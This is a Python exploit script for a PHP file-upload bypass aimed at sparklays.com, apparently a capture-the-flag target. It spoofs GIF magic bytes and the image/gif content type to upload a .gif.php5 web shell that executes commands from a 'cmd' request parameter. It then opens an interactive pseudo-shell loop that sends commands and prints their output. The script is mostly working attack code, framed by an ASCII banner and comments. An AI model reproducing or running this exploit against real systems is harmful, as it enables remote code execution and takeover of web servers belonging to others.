## PHP File upload bypass
## Edited magic bytes and content type to image/gif
## simple cmd payload via REQUEST PARAM
## Notice the multiple_files variable this is import for emulating multipart uploads as seen inm burpsuite
## https://stackoverflow.com/questions/12385179/how-to-send-a-multipart-form-data-with-requests-in-python
## https://2.python-requests.org/en/v2.8.1/user/advanced/#post-multiple-multipart-encoded-files <=========
import requests
def banner():
  print(""" 
                           .',,,'.                          
                          ;ONWWWNO;                         
                         :O0KXXXXX0;                        
                        .ONkdxdddONO.                       
                .:c'..;cOWM0l;;:lOWWOl;..,lc.               
                .OOloolkNMNX0dcxXKXW0kdoooko.               
                .Oo .;oxkxk0xoodk0kolxd,  c:                
                .Oo   .lOOkOkl;;lOO00c.  .dd.               
                 lk;.ckKNWWWkllkNMWWN0o,.:0:                
                 ;KXXWMMMW0oxXMMMMMMMWMN0KO'                
                 ;KMXd:;;;..dWMMMMWNNWMMMMK,                
                 ;KMx.      lWMMMMKc:0MMMMK;                
                 ;XM0;    .,OWWMMMW0ONMMMMK,                
                 .xWWO;:dx0NNXXXWWMMMMMMMNd.                
                  'xxcxNMMMWKkkkXMMMMMMMNd.                 
              . .. .'xNWWMMWK0XKXWMMMMWKl. .  .             
                ... ..;lkKWWNWMNNWWKkl;.   ..               
                .:c:,..  .lO0K000x:. ...,c:.                
                .o0XK0d,.. ..........oK0XNk'                
                  .;oc,odoc'''...':ldcoko;.                 
                       ..;cl;;dc,,'...                      
                      ..;c,.,;';llo:..                      
                 'cll:::,,. .   ..,,;c:,.                   
                 .xKd'                .,lxxl,.              
                  ..                     ,dc.               
                                           .   
""")

def sploit(filename):
  url = "http://sparklays.com/sparklays/design/changelogo.php"
  urltest = "http://localhost:9000"
  multiple_files = [('file',(f'{filename}.gif.php5',"GIF8;<?php system($_REQUEST['cmd']); ?>",'image/gif')),
                  ('submit',(None,'upload file'))]
  resp = requests.post(url,files=multiple_files)
  print("[+] Sending Payload!")
  print(resp)
  print(resp.text)
  test = requests.get(f"http://sparklays.com/sparklays/design/uploads/{filename}.gif.php5")
  if test.status_code == 200:
    print("[+] Shell! Acquired")
  else:
    print(test)
    print(test.text)
    print("[!] Failed Exiting!...")
    quit()
  while True:
    print("$TurtleShell> ",end="")
    cmd = input("")
    cmd_resp = requests.get(f"http://sparklays.com/sparklays/design/uploads/{filename}.gif.php5?cmd={cmd}")
    if cmd_resp.status_code == 200:
      print(cmd_resp.text.split("GIF8;")[1])
    else:
        print("Request Error!")
        print(cmd_resp)
        print(cmd_resp.text)

def main():
  banner()
  sploit("brrr")

main()
